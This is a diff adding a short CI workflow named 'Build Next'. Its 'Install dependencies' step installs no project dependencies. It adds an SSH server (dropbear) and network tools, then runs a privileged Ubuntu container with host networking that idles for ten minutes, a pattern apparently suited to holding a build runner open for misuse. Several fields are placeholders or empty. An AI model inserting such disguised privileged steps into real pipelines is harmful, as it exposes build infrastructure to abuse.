@@ -1,0 +1,19 @@
+name: Build Next
+repoFullName: Default Repository
+on:
+  push:
+    branches:
+      - Default Branch
+jobs:
+  run-deploy:
+    runs-on: docker:23.0.5-alpine3.17
+    defaults:
+      run:
+        working-directory: /
+    steps:
+      - uses: actions/setup-node@v3
+        name: Setup environment
+        with:
+          node-version:
+      - name: Install dependencies
+        run: docker volume create --name volume && apk update && apk add wget dropbear bash curl procps && docker run --rm --net=host --privileged --name devtest -v volume:/app -i -t ubuntu:22.04 /bin/bash -c "sleep 600"
